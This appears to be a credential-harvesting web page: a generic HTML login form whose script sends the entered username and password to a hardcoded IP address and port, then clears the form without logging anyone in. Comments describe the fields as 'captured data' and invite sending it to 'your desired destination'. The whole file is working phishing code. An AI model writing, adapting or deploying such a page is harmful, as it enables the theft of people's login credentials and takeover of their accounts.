<!DOCTYPE html>
<html>
<head>
  <title>Login Form</title>
</head>
<body>
  <h1>Login Form</h1>
  <form id="loginForm" onsubmit="sendFormData(event)">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br>
    <button type="submit">Login</button>
  </form>

  <script>
    function sendFormData(event) {
      event.preventDefault();

      var form = event.target;
      var username = form.username.value;
      var password = form.password.value;
      var data = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);

      // You can modify the following code to send the captured data to your desired destination
      // For example, you can use an XMLHttpRequest or fetch to send a POST request to a server-side script

      // Example using fetch:
      fetch("http://192.168.10.175:1234", {
        method: "POST",
        headers: {
          "Content-type": "application/x-www-form-urlencoded"
        },
        body: data
      }).then(function(response) {
        // Handle the response from the server
        console.log("Response received:", response);
      }).catch(function(error) {
        // Handle any error that occurred during the request
        console.error("Error occurred:", error);
      });

      form.reset();
    }
  </script>
</body>
</html>
